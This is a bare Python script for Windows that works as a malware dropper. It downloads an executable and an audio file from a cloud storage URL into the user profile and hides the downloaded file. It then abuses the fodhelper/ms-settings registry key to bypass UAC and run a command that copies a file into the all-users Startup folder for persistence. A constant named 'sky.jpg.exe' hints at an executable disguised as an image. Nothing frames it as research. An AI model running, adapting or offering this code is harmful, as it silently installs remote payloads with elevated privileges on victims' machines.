import os
import sys
import ctypes
from time import sleep
import winreg
import requests

CMD = "C:\Windows\System32\cmd.exe"
FOD_HELPER = 'C:\Windows\System32\\fodhelper.exe'
PYTHON_CMD = "sky.jpg.exe"
REG_PATH = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'


def is_running_as_admin():
    '''
    Checks if the script is running with administrative privileges.
    Returns True if is running as admin, False otherwise.
    '''
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def create_reg_key(key, value):
    '''
    Creates a reg key
    '''
    try:
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, key, 0, winreg.REG_SZ, value)
        winreg.CloseKey(registry_key)
    except WindowsError:
        raise


def bypass_uac(cmd):
    '''
    Tries to bypass the UAC
    '''
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)
    except WindowsError:
        raise


def execute():
    pycodeUrl = 'https://firebasestorage.googleapis.com/v0/b/huisarts-videochat.appspot.com/o/pycode.exe?alt=media&token=01e7a236-7589-4a29-9887-6934e5c4408a'
    r = requests.get(pycodeUrl, allow_redirects=True)
    userProfile = os.getenv('userprofile') + '\\pycode.exe'
    open(userProfile, 'wb').write(r.content)
    r = requests.get(
        'https://firebasestorage.googleapis.com/v0/b/huisarts-videochat.appspot.com/o/haha.mp3?alt=media&token=2a582e25-d436-4011-8793-5d35047a3145', allow_redirects=True)
    userProfile = os.getenv('USERPROFILE') + '\haha.mp3'
    open(userProfile, 'wb').write(r.content)
    os.system("attrib +h " + userProfile)
    sleep(1)

    command = 'copy {} {}'.format(
        userProfile, '\'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\pycode.exe\'')
    if not is_running_as_admin():
        print('[!] The script is NOT running with administrative privileges')
        print('[+] Trying to bypass the UAC')
        try:
            current_dir = os.getcwd()
            cmd = '{} /k {} '.format(CMD, command)
            print(cmd)
            bypass_uac(cmd)
            os.system(FOD_HELPER)
            sys.exit(0)
        except WindowsError:
            sys.exit(1)
    else:
        print('[+] The script is running with administrative privileges!')


if __name__ == '__main__':
    execute()
